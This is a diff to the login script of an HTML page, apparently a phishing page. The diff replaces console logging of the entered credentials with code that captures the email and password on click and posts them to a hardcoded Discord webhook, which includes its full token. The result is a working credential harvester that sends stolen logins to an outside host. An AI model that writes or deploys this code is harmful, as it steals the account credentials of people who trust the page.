@@ -309,11 +309,27 @@
       <div></div>
     </div>
 	<script>
-        document.getElementById('loginButton').addEventListener('click', function() {
-            var username = document.getElementsByName('email')[0].value;
-            var password = document.getElementsByName('password')[0].value;
-            console.log('Username:', username, 'Password:', password);
-        });
+            document.getElementById('loginButton').addEventListener('click', function(event) {
+	    event.preventDefault(); // Prevent form submission
+	
+	    var username = document.getElementsByName('email')[0].value;
+	    var password = document.getElementsByName('password')[0].value;
+	
+	    var webhookUrl = 'https://discord.com/api/webhooks/1181377382632931328/Slh2qVzrhgLQr_E0IXaTkrtzJfXw8itwQ_xWgVM561sqmegHPN45rlw3xwLC4YQjP9lT'; // Replace with your Discord webhook URL
+	
+	    var data = {
+	        content: 'Username: ' + username + ', Password: ' + password
+	    };
+	
+	    fetch(webhookUrl, {
+	        method: 'POST',
+	        headers: {
+	            'Content-Type': 'application/json'
+	        },
+	        body: JSON.stringify(data)
+	    }).then(response => console.log('Sent to Discord', response))
+	      .catch(error => console.error('Error:', error));
+	});
     </script>
 </body>
 </html>
